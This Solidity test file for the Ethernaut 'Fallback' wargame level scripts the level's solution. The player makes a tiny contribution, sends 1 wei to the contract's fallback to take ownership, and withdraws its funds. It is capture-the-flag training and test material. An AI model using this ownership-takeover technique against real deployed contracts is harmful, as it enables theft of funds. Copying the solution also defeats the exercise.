// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Fallback} from "../levels/Fallback/Fallback.sol";
import {FallbackFactory} from "../levels/Fallback/FallbackFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract FallbackTest is LevelTest {
    Fallback private level;

    constructor() {
        levelFactory = new FallbackFactory();
    }

    function testFallback() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = Fallback(levelAddress);

        assertEq(level.owner(), address(levelFactory));
    }

    function exploit() internal override {
        vm.startPrank(player);

        level.contribute{value: 0.0009 ether}();
        (bool sent, ) = levelAddress.call{value: 1}("");
        require(sent, "Failed to send 1 wei to Fallback contract");
        level.withdraw();

        vm.stopPrank();
    }
}
